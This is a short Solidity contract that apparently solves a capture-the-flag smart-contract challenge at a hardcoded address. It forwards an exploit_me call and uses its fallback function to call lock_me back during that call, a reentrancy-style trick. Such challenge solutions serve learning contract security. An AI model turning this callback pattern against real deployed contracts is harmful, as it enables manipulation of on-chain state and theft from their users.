// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ichall {
    function exploit_me(address winner) external;
    function lock_me() external;
    function winners(uint256) external view returns (address);

}

contract Contract {
    address ADDY = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    ichall chall = ichall(ADDY);

    function exploit_me(address winner) public {
        chall.exploit_me(winner);
    }
    
    fallback() external {
        chall.lock_me();
    }
}